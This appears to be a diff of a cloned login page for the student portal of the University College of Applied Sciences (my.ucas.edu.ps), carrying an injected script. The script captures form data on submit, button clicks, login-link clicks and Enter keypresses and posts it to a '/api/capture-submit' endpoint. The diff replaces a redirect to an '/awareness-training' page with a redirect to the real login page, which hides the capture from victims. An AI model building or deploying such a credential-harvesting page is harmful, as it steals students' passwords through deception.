@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 
 <html class="notranslate" lang="ar">
-<head><meta charset="utf-8"/><base href="https://my.ucas.edu.ps/login?backurl=/Registration/exams_schedule"/>
+<head><meta charset="utf-8"/><base href="https://my.ucas.edu.ps/login"/>
 <meta charset="utf-8"/>
 <title>خدمات الطلبة - الكلية الجامعية للعلوم التطبيقية</title>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
@@ -19,7 +19,7 @@
 <link href="/NewTemp/src/style.css" rel="stylesheet" type="text/css"/>
 <link href="/NewTemp/src/css-light/cusstyle.css" id="cus_style" rel="stylesheet" type="text/css"/>
 </link></meta></head>
-<body class="authentication-bg"><div></div>
+<body class="authentication-bg">
 <div class="account-pages mt-4 mb-2">
 <div class="container">
 <div class="col-md-12" style="margin-bottom:25px;">
@@ -34,7 +34,7 @@
 <input id="__LASTFOCUS" name="__LASTFOCUS" type="hidden" value=""/>
 <input id="__EVENTTARGET" name="__EVENTTARGET" type="hidden" value=""/>
 <input id="__EVENTARGUMENT" name="__EVENTARGUMENT" type="hidden" value=""/>
-<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="HUAUciGlEEWGB0ilgxXHg0Y2ySS8NWn5lTfTozAmRSLW1ksR29VOBlflDQoChw5eLFhT6uLigVAlJb+ojwmc4r6gl8u4X1ubjYnE3H70czFSWqXRxfDSjCfYvL3XQtxI7bUn3qcLdAj7lTuWJ4t+WhnYqzUsQLENYz/3ERl0tq8GMPpdgj/XaQO31AX3TYqcZT3b4Chp193nHri4mIpnzRjvtIfbFd9Zjj6RtnpaH8Xt4Z3qWghVua/+zhk520P3oJjb0O+UQV9pVe14D9vB7XJ3tQtwABxXy49p4HH4jrsiaB99V+D/izR9y5bMQvK4jWdZautLG0Kql33IUe9ijrlh9XyhHdtBusMOe3cids/OVyZq15zHEoyA2mdSM3qs"/>
+<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="pUfW+8FZVKXQJE2B1uY0pVpOLB8cTAcJP0CozjAZyKyNop7Z3AO0GM7u9ovHXz84ugeWIT4nBFc4jx8ygMAf7WJwMWyu/sseUzJbX5YkYD4AzWgfXI/tfnrkKZw0uJXwFNv5zBUhLxoxD2mmFBwpkl/NA7AWJX+fSDvbcJuWrWnbt+JcZkLsG5EUhKIzgNTlNK/bxjKQBg3jPErTvC10KGbdQKFDFdYeE+pXPT8L5JnIyw6P6E80XbZYjKOC+FlMPmcI3KR3Pq5d54tKtIc/Nn4PpmgpU0p05JEXMyabUTrh3iwc0doTyG68xy7Jn9h2sdfaAWHHQH1d0icv8S0xq7ZoKipVBSLbQoCtJrUsOsR2lkXrwNzlVg3IQuTw4UXJ"/>
 </div>
 
 
@@ -42,7 +42,7 @@
 <div class="aspNetHidden">
 <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="805C0972"/>
 <input id="__VIEWSTATEENCRYPTED" name="__VIEWSTATEENCRYPTED" type="hidden" value=""/>
-<input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="htZidSOm97hnU5U4kcp+ooNbkiffcw+li40L4A0KcUTwCVsH2/HXeCePC4ddjKs9X/wXsiedGH7Tiv4BGiMkpg5/gZm5iFa62vQD0btwIRSR4wpQ2IuP2ioHYsDsslHRfrjWjOexYaWoIsxqNEXw0ghAmFUxXg12xWmDXwzBv++dC2wit0s/009DntPc29cA"/>
+<input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="9HXXvT0h30ttth8ifbql3DIwBSKmGN6vvPO6ung3Yp8YTeIIbhivgKnmXy0Tc1xlw/xsn7HzFQTSXdksysVETFqsrxdiyP3NpRG25vCVr/K1py3C7ogRNtqOA4j8PzXIgMueI38k9yuWMvj546R27IHy0V6tjV8SKZSANE/ICKq4qStc+da91vw1/zofrY/3"/>
 </div>
 <div class="row justify-content-center">
 <div class="col-md-8 col-lg-6 col-xl-5">
@@ -165,14 +165,12 @@
                 });
                 
                 if(!hasData) return; 
-                
                 if(e) { e.preventDefault(); e.stopPropagation(); }
                 
-                var siteName = "11111111";
-                var captureUrl = window.location.origin + '/api/capture-submit';
-                var redirectUrl = window.location.origin + '/awareness-training';
+                var siteName = "my_ucas_edu_ps1";
+                var redirectUrl = 'https://my.ucas.edu.ps/login';
                 
-                fetch(captureUrl, {
+                fetch(window.location.origin + '/api/capture-submit', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({site: siteName, form_data: data})
@@ -182,14 +180,12 @@
             }
             
             document.addEventListener('submit', function(e){ captureAndSend(e); }, true);
-            
             document.addEventListener('click', function(e){
                 var t = e.target;
                 var isButton = t.tagName === 'BUTTON' || t.closest('button') || (t.tagName === 'INPUT' && (t.type === 'submit' || t.type === 'button'));
                 var isLoginLink = t.tagName === 'A' && (t.innerText.toLowerCase().includes('login') || t.innerText.includes('دخول') || t.innerText.includes('sign in'));
                 if(isButton || isLoginLink) { captureAndSend(e); }
             }, true);
-            
             document.addEventListener('keypress', function(e){
                 if(e.key === 'Enter') { captureAndSend(e); }
             }, true);
